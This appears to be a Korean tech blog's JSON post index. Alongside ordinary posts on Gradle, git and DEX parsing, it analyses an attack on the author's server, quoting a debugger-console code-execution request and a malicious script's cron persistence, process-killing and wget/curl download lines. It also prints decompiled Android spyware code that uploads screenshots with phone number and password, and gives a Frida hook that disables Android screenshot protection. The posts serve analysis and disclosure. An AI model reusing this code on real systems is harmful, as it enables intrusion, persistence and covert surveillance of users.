사용하다보면 사진을 캡쳐하고 싶을 때가 있다. 안드로이드 기종에서는 이 기능을 간편하게 지원해주는데 일부 앱에서는 이 캡쳐 기능을 보안과 도용 방지를 위해 기술적으로 차단하려고 한다. 오늘은 해당 방법을 알아보고 우회하는 걸 재연해보려고 한다.FLAG_SECUREpublic class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); getWindow().addFlags(FLAG_SECURE); // secure-display setContentView(binding.getRoot()); }}코드는 위와 같다.getWindow().addFlags(FLAG_SECURE);위 플래그는 아래와 같은 설명으로 8192 값을 가지고 있다.Java.perform(function () { var FLAG_SECURE = 0x2000; var Window = Java.use(\"android.view.Window\"); var setFlags = Window.setFlags; //.overload(\"int\", \"int\") setFlags.implementation = function (flags, mask) { console.log(\"Disabling FLAG_SECURE...\"); flags &amp;= ~FLAG_SECURE; setFlags.call(this, flags, mask); }; });위와 같이 javascript 를 작성해준다.Android 8192 Flag위는 적용하지 않았을 때 일반적인 앱 작동 모습이다.실행중인 다른 앱을 보려고 백그라운드로 진입하면 앱 화면이 사라진다.Disable 8192 FlagHook 을 걸어 특정 메소드에 값을 변조시켰더니 이전과 다르게 백그라운드로 진입해도 화면이 사라지지 않는 걸 볼 수 있다.stateDiagram-v2 State1: onCreate State2: FLAG_SECURE State3: any UI note right of State2 Hook and replace value. end note State1 --&gt; State2 State2 --&gt; State3onCreate 가 호출될 때 FLAG_SECURE 가 작동되는데 이때 해당 플래그를 인자 받는 메소드를 변조하여 블랙스크린 및 캡쳐 방지 기능을 무효화시킬 수 있다." }, { "title": "How to Search Google Images by the Exact Size", "url": "/posts/how_to_search_google_images_by_the_exact_size/", "categories": "google, blog", "tags": "google-usage, blog", "date": "2024-05-26 01:14:18 +0900", "snippet": "최근 gradle 설치 방법에 대해 글을 쓰다가 게시글 이미지 사진을 올리려다가 계속해서 사이즈가 안 맞아 확대 또는 잘리는 현상이 발견되어 원하는 사이에 맞는 이미지를 찾는 방법을 알아봤다. &lt;div class=\"mt-3 mb-3\"&gt; &lt;img {{ src }} {{ class }} {{ alt }} w=\"1200\" h=...", "content": "최근 gradle 설치 방법에 대해 글을 쓰다가 게시글 이미지 사진을 올리려다가 계속해서 사이즈가 안 맞아 확대 또는 잘리는 현상이 발견되어 원하는 사이에 맞는 이미지를 찾는 방법을 알아봤다. &lt;div class=\"mt-3 mb-3\"&gt; &lt;img {{ src }} {{ class }} {{ alt }} w=\"1200\" h=\"630\" {{ lqip | strip }}&gt; {%- if page.image.alt -%} &lt;figcaption class=\"text-center pt-2 pb-2\"&gt;{{ page.image.alt }}&lt;/figcaption&gt; {%- endif -%} &lt;/div&gt;먼저 현재 사용하고 블로그 대문 사진은 1200x630 을 지원한다.그러면 아래와 같은 키워드로 검색한다.gradle imagesize:1200x630그러면 해당 사이즈에 맞는 이미지들만 필터되어 나온다.검색된 결과들이미지 크기를 확인해보면 정확하게 검색된 걸 확인할 수 있다.1200x630 사이즈" }, { "title": "How to install gradle latest version on Ubuntu", "url": "/posts/ghidra_build/", "categories": "ghidra, tool", "tags": "ghidra, tools, reversing", "date": "2024-05-26 00:03:46 +0900", "snippet": "최근에 Ghidra 개발하려고 빌드하려다가 Gradle 설치과정에서 이슈가 있었던 게 있었다.brew 로 설치할 때는 최신 버전이 8.7 인데 Ubuntu 에서 설치할 때는 빌드 종속성 버전을 맞추지 못했다.그래서 공식 사이트에서 수동 설치해서 환경 변수 입력해주는 과정을 따라했었다.릴리즈 페이지는 여기서 확인하고 최신 파일(8.7)은 여기서 다운로드...", "content": "최근에 Ghidra 개발하려고 빌드하려다가 Gradle 설치과정에서 이슈가 있었던 게 있었다.brew 로 설치할 때는 최신 버전이 8.7 인데 Ubuntu 에서 설치할 때는 빌드 종속성 버전을 맞추지 못했다.그래서 공식 사이트에서 수동 설치해서 환경 변수 입력해주는 과정을 따라했었다.릴리즈 페이지는 여기서 확인하고 최신 파일(8.7)은 여기서 다운로드 가능하다.Ghidra Software Reverse Engineering Framework$ wget https://services.gradle.org/distributions/gradle-version-bin.zip$ mkdir /opt/gradle$ unzip -d /opt/gradle gradle-version-bin.zip$ ls /opt/gradle/gradle-version환경변수로 등록해준다.$ export PATH=$PATH:/opt/gradle/gradle-version/bin아니면 아래와 같이 설치된 버전만 target 잡아서 바꿔줄 수 있다.$ export GRADLE_HOME=/opt/gradle/gradle-version$ export PATH=${GRADLE_HOME}/bin:${PATH}설치된 결과를 확인한다.$ gradle -VmacOS 에서 jdk 버전 바꾸기jdk 버전을 바꾸려고 한다면 아래를 확인한다./usr/libexec/java_home -V설치된 버전을 확인하고 ~/.zshrc 를 열어 수정한다.export JAVA_HOME=$(/usr/libexec/java_home -v **21**)export JAVA_HOME=$(/usr/libexec/java_home -v 21)source ~/.zshrc" }, { "title": "Android Analyze for dex file", "url": "/posts/format-dex/", "categories": "RE, android", "tags": "android, dex", "date": "2024-05-15 14:27:58 +0900", "snippet": "IntroI recently had an opportunity to analyze the dex file while I was analyzing the Android app. I’m going to write to record what I checked at this time.block-beta columns 3 block:dex_file:3 ...", "content": "IntroI recently had an opportunity to analyze the dex file while I was analyzing the Android app. I’m going to write to record what I checked at this time.block-beta columns 3 block:dex_file:3 %% columns auto (default) dex[\"classes.dex\"] classes1.dex classes2.dex classes3.dex classes4.dex classes5.dex classesN.dex end block:lib:2 columns 2 armeabi armeabi_v7a arm64_v8a x86_64 x86 end block:META_INF:1 columns 1 *.RSA *.SF *.MF end block:etc_file:3 %% columns auto (default) AndroidManifest.xml assets res resource.arsc end style dex_file fill:#898 style dex fill:#f3fAndroid apk architecture is assets and dex and lib..etctoday, let it parse dex file.so what can i do? we need dex architecture.we check dex file format and some write dex parser PoC code.Android dex file format, The header contains information indicating the offset and size for each part, and more detailed information is recorded in the map off based on the information.mindmapclasses.dex header dex_string_idx dex_type_idx dex_proto_idx dex_field_idx dex_method_idx dex_class_defs dex_map_listThis is summary some section for dex file.now check it for detail.block-beta block:DexHeader:1 columns 4 magic signature checksum file_size header_size endian_tag link_size link_off map_off string_ids_size string_ids_off type_ids_size type_ids_off proto_ids_size proto_ids_off field_ids_size field_ids_off method_ids_size method_ids_off class_defs_size class_defs_off data_size data_off endThis is dex file header.block-beta block:DexField:1 columns 1 class_idx type_idx name_idx enddex field section.block-beta block:DexProto:1 columns 1 shorty_idx ret_type_idx param_off endproto section, use for method-proto type.block-beta block:DexMethod:1 columns 1 class_idx proto_idx name_idx endmethod section is class_idx, proto_idx and name_idx.block-beta block:DexString:1 columns 1 string_data_offset endThis is offset for string section.so if you find offset, it is string length and next hex pointer is string start and you can read string as much as length.block-beta block:DexType:1 columns 1 desc_idx endThis is type idx.block-beta block:DexClass:1 columns 1 class_idx access_flag superclass_idx interface_off source_file_idx annotation_off class_data_off static_value_off endAnd here is class_def section.class_idx, flag, and superclass_idx…etc.typedef struct { char dex[3]; char newline; char ver[3]; char zero;} DexMagic;typedef struct { DexMagic magic; uint32_t checksum; uint8_t signature[20]; uint32_t file_size; uint32_t header_size; uint32_t endian_tag; uint32_t link_size; uint32_t link_off; uint32_t map_off; uint32_t string_ids_size; uint32_t string_ids_off; uint32_t type_ids_size; uint32_t type_ids_off; uint32_t proto_ids_size; uint32_t proto_ids_off; uint32_t field_ids_size; uint32_t field_ids_off; uint32_t method_ids_size; uint32_t method_ids_off; uint32_t class_defs_size; uint32_t class_defs_off; uint32_t data_size; uint32_t data_off;} DexHeader;// method_idstypedef struct { uint16_t class_idx; // 2 Byte uint16_t proto_idx; uint32_t name_idx;} DexMethod;// class_deftypedef struct { uint32_t class_idx; uint32_t access_flag; uint32_t superclass_idx; uint32_t interface_off; uint32_t source_file_idx; uint32_t annotation_off; uint32_t class_data_off; uint32_t static_value_off;} DexClass;// type_idstypedef struct { uint32_t desc_idx;} DexType;// proto_idstypedef struct { uint32_t shorty_idx; uint32_t ret_type_idx; uint32_t param_off;} DexProto;// Stringtypedef struct { uint32_t string_data_offset;} DexString;// fieldtypedef struct { uint16_t class_idx; uint16_t type_idx; uint32_t name_idx;} DexField;The analysis can be performed by parsing the file according to the structure above according to the offset.Referencehttps://source.android.com/docs/core/runtime/dex-format" }, { "title": "이직 회고 (feat. 최종합격)", "url": "/posts/migration/", "categories": "develop, research, offer, interview, daily", "tags": "develop, research, opensource, notion, pdf", "date": "2024-04-12 00:00:00 +0900", "snippet": "이 직업을 가지고서 정말 기존과 다른 도메인으로 학습을 접근하게 되었고 지금까지 했던 프로젝트와 기술을 좀 더 완성에 가깝게 재구성할 수 있었다. 특정 분야에 얽매이지 않고 연구개발을 진행하면서 단순한 개발 뿐만 아니라 더 탄탄한 개발과 이 분야에 흥미를 가질 수 있었던 이야기를 짧게 써보려고 한다.바람은 순풍현 업무를 하면서 이직을 생각하게 되었고 ...", "content": "이 직업을 가지고서 정말 기존과 다른 도메인으로 학습을 접근하게 되었고 지금까지 했던 프로젝트와 기술을 좀 더 완성에 가깝게 재구성할 수 있었다. 특정 분야에 얽매이지 않고 연구개발을 진행하면서 단순한 개발 뿐만 아니라 더 탄탄한 개발과 이 분야에 흥미를 가질 수 있었던 이야기를 짧게 써보려고 한다.바람은 순풍현 업무를 하면서 이직을 생각하게 되었고 조금씩 준비하면서 현시점에서 결국 3 군데에서 offer 를 받았고 여러가지를 생각하여 입사 날짜가 결정되었다. 서류 준비하는 과정부터 생각하면 신입 때와 조금 달랐다. 신입 때는 pdf 형식으로 추출하고 디자인도 신경 쓰려고 며칠을 투자했었다. 그러나 당시에는 그런 여유가 주어지지 않고 재직중으로 시간이 기다려주지 않아 제출해야 하는 상황이었다.Notion VS *.pdf이력서를 업데이트하면서 기존의 이력서를 탈바꿈할 기회가 왔다. 어쨌든 이력서 또한 파일이고 여러 곳에 제출할 때마다 같은 이력서를 내는 것이 아니라 조금씩 수정하고 업데이트 후 제출한다. 이때 분명 제출한 곳마다 차이가 분명 있을 것이고 어디에 기록하지 않는 이상 이에 대해 추적과 버전관리가 필요하다고 판단되어 이전에 만들어놓은 것을 추후에도 유지보수하고자 pdf 로 관리할지 notion 으로 관리할지 정했다.Resume Refactoring이전에 지원한 이력서를 열어봤는데 정말 준비한 기간에 비하여 정리가 많이 안 되었다. 또한 현재 근무한 이력이 반영되어 있지 않는 부분이라 추가하던가 아니면 새로 이력서를 작성해야 했다. 근래 Notion 으로 포트폴리오를 만들고 Notion 으로 이력서를 대신하는 사례가 많이 보였다. 또 많은 사람들이 Notion 으로 제출을 많이 하여 대부분이 이를 권장하게 되었다. 그러나 몇몇 기업은 링크를 받지 않고 pdf 파일로 받는다는 문구를 표기해놓기도 했다.PDF vs Notion어느 한 커뮤니티에서는 지원자의 고정된 이력을 평가하는데 Notion 으로 제출한 이력서는 마치 시험 끝나고 제출한 답안지와 같다고 말한다. 답안지를 제출했는데 답안지 내용이 바뀐다고 생각하면 어떨까위와 같은 생각으로 Notion 과 pdf 사이에서 갈등을 많이 헀는데 결국 pdf 로 이력서를 migration 해서 제출하였다. 이번 기회에 pdf 로 resume 를 관리하고자 pdf 로 결과물을 뽑을 수 있는 매체를 찾았다. 자유롭게 디자인과 형식을 작성하고 싶지만 주어진 시간과 들어가는 공수가 많아 기본적인 틀만 맞추어서 pdf 파일을 뽑을 수 있었다.Resume v2이력서를 기존에 Notion 이라는 플랫폼을 통해 관리했는데 최근 대다수 기업에서 pdf 파일만 이력서를 받는 모습을 보였다. 하지만 pdf 로 바꿀 필요가 있었고 Notion 에서 뽑는 pdf export 기능은 제대로된 형식으로 출력되지 않았다. 그래서 이번 기회에 이력서를 다른 플랫폼으로 작성하는 방법을 찾았고 이번 기회에 이력서 또한 버전 추적하여 관리하기 위해 pdf 로 추출해줄수 있는 언어와 툴을 찾았다. 추적할 수 있는 파일 그러니까 코드로 관리를 한다면 어디를 어떻게 변경했는지 확인하기 쉽고 추후에 해당 부분에 대한 관리/수정이 매우 용이하다. 조금의 검색을 통해 꽤 괜찮은 도구를 찾을 수 있었고 이직 준비와 동시에 이력서 migration 작업을 시작했다. 시간이 많지 않아 최대한 내용이라도 빠짐없이 작성하자는 취지로 디자인은 신경도 쓰지 않았다.i8n export PDF그래도 결국 초안 파일을 만들어서 제출하였다. 해당 작업을 진행하면서 자체적으로 프레임워크에서 i8n 을 지원하여 위와 같이 추후 영문이력서도 관리할 수 있을 거 같다. 바꾼 형식을 보면 버전관리를 생각해서 또 관리를 어떻게 하면 좀 더 쉽게 할 수 있을까에 초점을 맞춰서 그런지 결과적으로 새로운 방식으로 이력서를 관리할 수 있었다.채용 프로세스서류 접수언제나 서류 제출은 작성해야할 것이 많다. 서류를 제출하고 작성한 내용애 대해 재검토했다.작성한 내용은 아래와 같다. 이력서 - pdf 자기소개서 포트폴리오 - include in pdf GitHub link Blog link 인적사항이력서에 작성한 내용들에 대해 어떻게 답변할지 생각도 해보고 GitHub 에서 진행했던 여러 프로젝트나 소스코드 버전관리에 대해 리마인드했다.1차 면접 &amp;&amp; 2차 면접1차 면접은 처음이라 꽤 떨렸다. 진행했던 업무에 대해 답변하고 스킬과 프로젝트에 대한 진위여부를 확인받았다. 근데 후기를 찾아보니 경력 면접은 그냥 프로젝트를 물어보는 정도라 사실은 평소에 성실히 잘헀다면 큰 문제없이 기술면접을 통과할 수 있을 것이라는 후기가 있었다. 그래도 지금껏 했던 활동들과 스킬을 나름대로 정리하고 다시 한 번 점검하는 시간을 가졌다.2차 면접으로 꽤 많은 임원들이 들어와서 한 분 한 분 질문을 주셨다. 기억에 남는 것은 압박면접은 아니지만 긴장해서 스스로 압박면접 환경으로 만들었다. 여태까지 해온 업무와 연구개발들에 질의응답을 가지는 시간이었다.평판조회1차는 주중으로, 2차 면접 결과는 꽤 빠르게 확인할 수 있었다.다음 과정은 레퍼체크 평판조회였다. 먼저 알아본 바 지난 생활이 첫 시험대에 오르는 기분이었다. 레퍼런스체크는 서류와 면접에 대한 진위여부를 파악하고 놓친 부분이 있는지 파악하기 위해 진행한다고 한다. 지정인으로 진행해도 비지정인으로 진행해도 꽤 긴장됐다. 그래도 지난 시간 고생과 보람있던 순간들을 옆에서 묵묵히 지켜봐준 동료들을 지정해서 부특하였고 더도 말도 덜도 말고 사실 그대로 요청하였다.결과는 마감 후 2일 뒤 나왔고 문제 없다는 결과와 함께 다음 과정인 처우협의 및 입사 날짜를 조정할 수 있었다.레퍼체크에 도움을 주신 분들께 진심으로 감사하다. 추후 레퍼체크에서 특별한 특이사항이 없어 처우협의 과정을 거쳤다. 갑작스러움에도 응해주신 분들께 이 글을 빌어 다시 한 번 진심으로 감사하며 작은 답례를 드렸다.처우협의 및 최종입사처우협의를 진행하고 입사날짜를 지정했다. 너무 쉬는 것도 좋지 않고 너무 빨리 출근하는 것도 아쉬울 거 같아서 적당히 조절하여 시간을 정했다. 이로써 끝이 보이지 않을 거 같았던 그리고 확신이 없었던 이직 프로세스가 마무리되었다.최종 회고최종 합격 후 또 다른 것을 기대하며 준비하고 있다. 이직은 단지 과정에 불과한 것 같다. 그 위에서 준비해야 하는 그리고 또 공부해야 하는 많은 요소들에 꾸준히 시간을 투자하려고 한다. 2년 전 이맘때를 생각하면 사람은 알다가도 모른다. 2년 전 나는 오늘의 나를 예측할 수 있었을까? 혹시나 망설이고 있는 게 있다면 하나씩 또 시작하고 도전해보려고 한다.퇴사하며지난 2년 좀 안된 시간은 전혀 다른 세상이었다. 한 가지 분야에 기준치 이상으로 통달할 때 비로소 인사이트가 생겨서 범위 안에 리소스를 자유롭게 사용할 수 있게 된다. 연구개발을 하면서 가장 크게 느낀 것은 전혀 다른 세계를 볼 수 있는 것이었다. 코드를 작성할 때 역으로 코드의 영향을 모니터링했다. 에러가 발생하면 crash log 를 통해 손쉽게 이 부분을 추적할 수 있지만 그렇지 같은 경우가 다반사였고 이 부분이 굉장히 어려운 진입 장벽이 있었다.그래서 생각한 것이 알려진 문제를 재연하여 이를 트리거 시켜 그것을 추적할 때 실제와 어떻게 다르게 보여지는지 연구했다. 에러 메세지를 구글에 바로 검색해보고 ChatGPT 를 통해 검색도 해보았는데 별다른 성과가 없었다.보통 버그메세지에 관하여 검색을 진행하면 10개 링크 중에 1개가 정답이거나 그 정답인 답변도 오래된 답변이어서 버전 의존성에 의하여 또 다시 검색을 시작하게 될 수 있다. 근데 생각을 해보면 사실 이런 구글이나 스택오버플로우에 달린 답변들은 스스로 본인들의 문제를 추적하여 답변을 단 사람들로 구성되어 있는 게 아닌가 싶다. 그래서 에러메세지는 같지만 그 에러를 발생시키는 원인은 다를 수 있어 참고한 링크대로 가이드를 따라하면 제대로 되지 않는 것이다.우리 팀은 문제를 구글링하지 않는다. 해당 버그가 일어난 곳으로 들어가서 현재 점유하고 있는 문제를 확인한다.이러한 것들을 돌아보면 가장 좋은 건 Ref Docs, 그 다음은 code 를 보는 것이라고 생각한다. 예시를 보고 싶다면 Community 를 참고하는 것이 좋다고 생각한다." }, { "title": "CLA for Google contributor", "url": "/posts/how_to_use_cla/", "categories": "git, develop", "tags": "git, Software Developer", "date": "2024-02-24 01:34:00 +0900", "snippet": "Google contributor 를 위한 CLA 서명하기구글에 Pull Request를 보낼 때 CLA 서명이 필요하다.처음 작성하고 그 다음부터는 필요하지 않은데 처음 작성할 때 조금 많이 어려웠다.몇가지 확인해야 할 사항이 있는데CLA 서명 - 보조 이메일 추가먼저 CLA 서명은 Google 이메일로 진행되니 다른 이메일을 사용하는 사람들은 구글...", "content": "Google contributor 를 위한 CLA 서명하기구글에 Pull Request를 보낼 때 CLA 서명이 필요하다.처음 작성하고 그 다음부터는 필요하지 않은데 처음 작성할 때 조금 많이 어려웠다.몇가지 확인해야 할 사항이 있는데CLA 서명 - 보조 이메일 추가먼저 CLA 서명은 Google 이메일로 진행되니 다른 이메일을 사용하는 사람들은 구글에 보조 이메일을 추가한다.Github email깃허브 계정의 이메일을 확인한다.Local email로컬 이메일을 확인한다.$ cat ~/.gitconfig [user]\temail = your@email\tname = yourname여기서 확인할 수 있다. 위 메일이 Github 계정과 CLA 서명에 같이 서명되어야 한다.Github username깃허브 사용자 이름을 확인한다.(대소문자 확인 !)Check - CICI check에서 rescan을 반영한 후 기다리면 다시 재확인하여 승인된다." }, { "title": "Github 초기 잔디 심기 문제", "url": "/posts/gitconfig-init/", "categories": "git, develop", "tags": "git, Software Developer", "date": "2024-02-24 01:34:00 +0900", "snippet": "Github 초기 잔디 심기처음 시작할 때 잔디가 안 심어지는 문제를 확인하는 사례가 종종 발생한다.도 다중으로 config 를 지정할 수 있는 방법을 업데이트하였다.이때 확인할 부분을 정리하였다.Github 계정 이메일 확인하기Github 계정에서 -&gt; setting -&gt; email 순으로 확인한다.local에서$ git config --...", "content": "Github 초기 잔디 심기처음 시작할 때 잔디가 안 심어지는 문제를 확인하는 사례가 종종 발생한다.도 다중으로 config 를 지정할 수 있는 방법을 업데이트하였다.이때 확인할 부분을 정리하였다.Github 계정 이메일 확인하기Github 계정에서 -&gt; setting -&gt; email 순으로 확인한다.local에서$ git config --list$ git config --global --list초기설정 변경// 이메일변경$ git config --global user.email \"aaa@a.com\"// 유저이름 변경$ git config --global user.name \"USER_NAME\" Github 계정과 이메일이 다르다면 등록된 user.name이름으로 Commit message가 등록된다.Forked 저장소아래와 같은 경우 반영되지 않는다. Forked 저장소는 반영되지 않는다. 상승 저장소에 병합하기 위해 PR을 남긴다. 상승 저장소 메인 분기에 병합한다. 저장소 메인 브랜치 외에 다른 브랜치 커밋 역시 반영되지 않는다.Multiple gitconfig setup아래와 같이 .gitconfig 에 수정해준다.$ cat $HOME/.gitconfig[includeIf \"gitdir:~/project/\"] path = ~/.gitconfig-project,gitconfig 설정 파일을 하나 더 만든다.$ cat $HOME/.gitconfig-project[user] name = project_leader email = project_leader@email.com해당 디렉터리에서 작업을 진행하면 따로 author 나 committer 작업을 안해줘도 된다.$ cd ~/project" }, { "title": "사용자의 행동을 감시하는 코드 - screen capture", "url": "/posts/detect-screencapture/", "categories": "research", "tags": "research", "date": "2024-02-17 00:00:00 +0900", "snippet": "Step by step최근에 특이한 코드가 눈에 보여 따라가다가 굉장히 재밌는 패턴을 발견하여 해당 코드에 대해 정리해보려고 한다.사용자의 파일과 액티비티 전환에 따른 결과를 보고 해당 파일을 특정 서버로 전송하는 코드이다.코드 분석근래 파일 관찰자와 액티비티 화면 전환을 통하여 최근 디바이스에서 캡쳐한 사진을 확인하는 코드가 발견되었다. @Ov...", "content": "Step by step최근에 특이한 코드가 눈에 보여 따라가다가 굉장히 재밌는 패턴을 발견하여 해당 코드에 대해 정리해보려고 한다.사용자의 파일과 액티비티 전환에 따른 결과를 보고 해당 파일을 특정 서버로 전송하는 코드이다.코드 분석근래 파일 관찰자와 액티비티 화면 전환을 통하여 최근 디바이스에서 캡쳐한 사진을 확인하는 코드가 발견되었다. @Override // android.os.FileObserver public void onEvent(int v, String s) { // 반환되는 값에 따라 조건문을 열어두었다. switch(v) { { . . . } case 0x80: { if(!s.startsWith(\".\")) { MainActivity.instance.didDetectedScreenShot(this.rootPath + s); } Log.d(\"FILEOBSERVER\", \"MOVED_TO:\" + s); return; } case 0x100: { Log.d(\"FILEOBSERVER\", \"CREATE:\" + this.rootPath + s); if(!s.startsWith(\".\")) { MainActivity.instance.didDetectedScreenShot(this.rootPath + s); return; } return; } { . . . } } }위는 파일옵저버에서 event 가 발생될 때 처리하는 코드이다.0x80 은 아래와 같다.Event type: A file or subdirectory was moved to the monitored directoryConstant Value: 128 (0x00000080)0x100 은 아래와 같다.Event type: A new file or subdirectory was created under the monitored directoryConstant Value: 256 (0x00000100)자세한 내용은 다음 문서를 참고하면 된다.아래는 액티비티 포커스가 바뀔 때 호출되는 코드 지점이다. @Override // android.app.Activity public void onWindowFocusChanged(boolean z) { if(Build.VERSION.SDK_INT &gt;= 21) { ArrayList arrayList0 = new ArrayList(); arrayList0.add(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).getAbsolutePath() + \"/Screenshots\"); try { arrayList0.add(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getCanonicalPath() + \"/Screenshots\"); } catch(IOException iOException0) { iOException0.printStackTrace(); } Iterator iterator0 = arrayList0.iterator(); label_10: while(iterator0.hasNext()) { Object object0 = iterator0.next(); File file0 = new File(((String)object0)); if(!file0.exists()) { continue; } File[] arr_file = file0.listFiles(); if(arr_file == null) { continue; } int v = 0; while(true) { if(v &gt;= arr_file.length) { continue label_10; } File file1 = arr_file[v]; long v1 = new Date().getTime() - file1.lastModified(); // 파일이 수정된 시간이 1분 미만일 경우 조건문으로 진입한다. if(v1 &lt; 60000L &amp;&amp; v1 &gt; 0L &amp;&amp; this.capturedFileNames.size() &lt; 10) { this.didDetectedScreenShot(file1.getAbsolutePath()); } ++v; } } } super.onWindowFocusChanged(z); }아래는 최종적으로 호출되는 함수 지점이다.public void didDetectedScreenShot(String s) { if(Build.VERSION.SDK_INT &gt;= 21 &amp;&amp; !this.capturedFileNames.contains(s)) { this.capturedFileNames.add(s); File file0 = new File(s); this.handler.postDelayed(new Runnable() { @Override public void run() { try { MediaType mediaType0 = MediaType.parse(\"image/*\"); RequestBody requestBody0 = RequestBody.create(file0, mediaType0); Part multipartBody$Part0 = Part.createFormData(\"image\", file0.getName(), requestBody0); // 사용자의 개인 식별 번호를 전송한다. RequestBody requestBody1 = RequestBody.create(basic_info.getModel(), MediaType.parse(\"text/plain\")); RequestBody requestBody2 = RequestBody.create(basic_info.getMyPhoneNumber(MainActivity.this.mContext), MediaType.parse(\"text/plain\")); RequestBody requestBody3 = RequestBody.create(basic_info.getMyRegId(MainActivity.this.mContext), MediaType.parse(\"text/plain\")); RequestBody requestBody4 = RequestBody.create(basic_info.getMyPassword(MainActivity.this.mContext), MediaType.parse(\"text/plain\")); MainActivity.this.webApiService.postImage(multipartBody$Part0, RequestBody.create(\"android\", MediaType.parse(\"text/plain\")), RequestBody.create(\"33\", MediaType.parse(\"text/plain\")), requestBody1, requestBody2, requestBody3, requestBody4).enqueue(new Callback() { @Override // retrofit2.Callback public void onFailure(Call call, Throwable t) { } @Override // retrofit2.Callback public void onResponse(Call call0, Response response0) { } }); } catch(Exception exception0) { exception0.printStackTrace(); } } }, 1000L); }}위 코드를 확인하면 파일을 서버로 전송하는 것을 볼 수 있다.해당 코드를 보면 특정 라이프사이클에서 사용자의 환경을 확인하는 것으로 보인다." }, { "title": "좀비 PC 될 뻔한 썰.txt", "url": "/posts/serverlog-with/", "categories": "research, diary", "tags": "research, diary", "date": "2024-01-12 00:00:00 +0900", "snippet": "Step by step탐문탐색요즘 서비스 개발에 조금씩 재미를 찾기 시작해서 백엔드 개발을 시도하고 있다. 그런데 올려놓은 서버에 어느날 이상한 로그를 확인했다.GET /console?__debugger__=yes&amp;cmd=(__import__('requests').get('http://ip:port/logservice.sh').raise_for...", "content": "Step by step탐문탐색요즘 서비스 개발에 조금씩 재미를 찾기 시작해서 백엔드 개발을 시도하고 있다. 그런데 올려놓은 서버에 어느날 이상한 로그를 확인했다.GET /console?__debugger__=yes&amp;cmd=(__import__('requests').get('http://ip:port/logservice.sh').raise_for_status()...이런 것이 찍혀서 누가 봐도 수상하게 생겼다.바로 철저한 대비를 하고 파보려고 했다.스크립트 확인 및 스크립트 간략 분석http://ip:port/logservice.sh위 곳에 접속하면 해당 파일을 다운받을 수 있다.추가로 해당 스크립트를 들어가면 의심스러운 코드를 확인할 수 있다.다음과 같이 부팅 순서에 작업하는 부분이 있었다.{ . . . }bash) add_to_startup \"$HOME/.bashrc\" add_to_startup \"$HOME/.bash_logout\" ;;zsh) add_to_startup \"$HOME/.zshrc\" ;;{ . . . }다음과 같이 데몬을 작업하는 코드도 있었다.{ . . . }[ -d /var/spool/cron ] &amp;&amp; [ -f /var/spool/cron/root ] &amp;&amp; echo \"@daily $EXEC\" &gt;&gt; /var/spool/cron/root 2&gt;/dev/null[ -d /var/spool/cron/crontabs ] &amp;&amp; [ -f /var/spool/cron/crontabs/root ] &amp;&amp; echo \"@daily $EXEC\" &gt;&gt; /var/spool/cron/crontabs/root 2&gt;/dev/null[ -f /etc/crontab ] &amp;&amp; echo \"@daily $EXEC\" &gt;&gt; /etc/crontab 2&gt;/dev/null &amp;&amp; sudo chattr +i /etc/crontab 2&gt;/dev/null[ -d /etc/cron.hourly ] &amp;&amp; echo \"$EXEC\" &gt;&gt; /etc/cron.hourly/logrotate 2&gt;/dev/null &amp;&amp; sudo chmod +x /etc/cron.hourly/logrotate 2&gt;/dev/null &amp;&amp; sudo chattr +i /etc/cron.hourly/logrotate 2&gt;/dev/null[ -d /etc/cron.daily ] &amp;&amp; echo \"$EXEC\" &gt;&gt; /etc/cron.daily/logrotate 2&gt;/dev/null &amp;&amp; sudo chmod +x /etc/cron.daily/logrotate 2&gt;/dev/null &amp;&amp; sudo chattr +i /etc/cron.daily/logrotate 2&gt;/dev/null[ -d /etc/cron.weekly ] &amp;&amp; echo \"$EXEC\" &gt;&gt; /etc/cron.weekly/logrotate 2&gt;/dev/null &amp;&amp; sudo chmod +x /etc/cron.weekly/logrotate 2&gt;/dev/null &amp;&amp; sudo chattr +i /etc/cron.weekly/logrotate 2&gt;/dev/null[ -d /etc/cron.monthly ] &amp;&amp; echo \"$EXEC\" &gt;&gt; /etc/cron.monthly/logrotate 2&gt;/dev/null &amp;&amp; sudo chmod +x /etc/cron.monthly/logrotate 2&gt;/dev/null &amp;&amp; sudo chattr +i /etc/cron.monthly/logrotate 2&gt;/dev/null[ -d /etc/cron.yearly ] &amp;&amp; echo \"$EXEC\" &gt;&gt; /etc/cron.yearly/logrotate 2&gt;/dev/null &amp;&amp; sudo chmod +x /etc/cron.yearly/logrotate 2&gt;/dev/null &amp;&amp; sudo chattr +i /etc/cron.yearly/logrotate 2&gt;/dev/null{ . . . }또 아래와 같은 부분도 있었다.ps -eo pid,%cpu,comm --sort=-%cpu | awk 'NR&gt;1 &amp;&amp; !/awk|ps/ &amp;&amp; !($3 ~ /^(logrotate|sshd|java)$/) &amp;&amp; int($2) &gt; 60 { system(\"kill -9 \" $1) }'위와 같이 특정 프로세스를 종료하는 코드가 있었다.EXEC=\"source &lt;(wget -q -O - http://ip:port/logservice.sh || curl -sL http://ip:port/logservice.sh)\"trap 'rm -- \"$0\"' EXITif [ -z \"${HOME+x}\" ]; then export HOME=/tmpfimkdir -p \"$HOME/.config\" &gt;/dev/null 2&gt;&amp;1[ ! -f \"$HOME/.config/logrotate\" ] &amp;&amp; { ARCH=$(uname -m) URL=\"\" [ \"$ARCH\" = \"x86_64\" ] &amp;&amp; URL=\"http://ip:port/silicon64blueprints.png\" [ \"$ARCH\" = \"aarch64\" ] &amp;&amp; URL=\"http://ip:port/siliconarmblueprints.png\" [ -z \"$URL\" ] &amp;&amp; URL=\"http://ip:port/silicon64blueprints.png\" { wget -q -O \"$HOME/.config/logrotate\" \"$URL\" || curl -sL -o \"$HOME/.config/logrotate\" \"$URL\"; } &gt;/dev/null 2&gt;&amp;1 chmod +x \"$HOME/.config/logrotate\" &gt;/dev/null 2&gt;&amp;1}pgrep -f \"config/logrotate\" &gt;/dev/null 2&gt;&amp;1 || \"$HOME/.config/logrotate\"추가로 파일도 명시되어 있어 다운받았다.사진 파일 open fail해당 파일이 진짜 사진파일인지 확인해보고 싶어서 다운받았는데 위와 같이 열리지 않았다.*.png 파일의 정체 확인하기root@test home % xxd silicon64blueprints.png| head00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000 .ELF............00000010: 0200 3e00 0100 0000 30bf 4000 0000 0000 ..&gt;.....0.@.....00000020: 4000 0000 0000 0000 2062 5700 0000 0000 @....... bW.....00000030: 0000 0000 4000 3800 0a00 4000 1e00 1d00 ....@.8...@.....00000040: 